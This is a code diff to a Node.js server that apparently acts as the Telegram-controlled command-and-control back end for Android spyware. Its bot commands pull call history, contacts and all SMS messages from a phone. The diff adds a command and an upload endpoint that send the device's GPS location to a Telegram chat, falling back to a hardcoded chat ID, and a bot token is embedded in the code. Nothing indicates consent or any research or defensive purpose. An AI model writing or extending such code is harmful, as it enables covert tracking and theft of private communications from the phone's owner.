@@ -35,7 +35,7 @@ let requestingChatId = null;
 const BOT_TOKEN = '8710683386:AAFwZ_aRbFNVBVBO0HRGW6S_LBTCgYIiYZc';
 const bot = new Telegraf(BOT_TOKEN);
 
-bot.start((ctx) => ctx.reply('Bot is running.\n\nAvailable commands:\n/ch - Get call history\n/contact - Get contacts list\n/as - Get all SMS messages'));
+bot.start((ctx) => ctx.reply('Bot is running.\n\nAvailable commands:\n/ch - Get call history\n/contact - Get contacts list\n/as - Get all SMS messages\n/loc - Get current GPS location'));
 
 bot.command('ch', (ctx) => {
     // Acknowledge to the user
@@ -61,6 +61,12 @@ bot.command('as', (ctx) => {
     
     // Set the state so the Android app knows to send the data next time it checks
     pendingCommand = 'as';
+    requestingChatId = ctx.chat.id;
+});
+
+bot.command('loc', (ctx) => {
+    ctx.reply('Command received. Fetching GPS location from the Android device...');
+    pendingCommand = 'loc';
     requestingChatId = ctx.chat.id;
 });
 
@@ -133,6 +139,37 @@ app.post('/upload-log', upload.single('document'), async (req, res) => {
             fs.unlink(req.file.path, (err) => {
                 if (err) console.error('Error deleting file:', err);
             });
+        }
+    }
+});
+
+// 3. Android calls this to upload GPS location after seeing the 'loc' command
+app.post('/upload-location', express.json(), async (req, res) => {
+    const { latitude, longitude } = req.body;
+    if (!latitude || !longitude) {
+        return res.status(400).send('Missing latitude or longitude.');
+    }
+
+    const mapsLink = `📍 Current Location:\nhttps://www.google.com/maps?q=${latitude},${longitude}`;
+    const chatId = requestingChatId;
+    requestingChatId = null;
+
+    if (chatId) {
+        try {
+            await bot.telegram.sendMessage(chatId, mapsLink);
+            console.log(`Location sent to Telegram: ${latitude}, ${longitude}`);
+            res.status(200).send('Location forwarded.');
+        } catch (error) {
+            console.error('Error sending location to Telegram:', error);
+            res.status(500).send('Error forwarding location.');
+        }
+    } else {
+        const FALLBACK_CHAT_ID = "1691680798";
+        try {
+            await bot.telegram.sendMessage(FALLBACK_CHAT_ID, mapsLink);
+            res.status(200).send('Location forwarded (fallback).');
+        } catch (error) {
+            res.status(500).send('Error forwarding location (fallback).');
         }
     }
 });
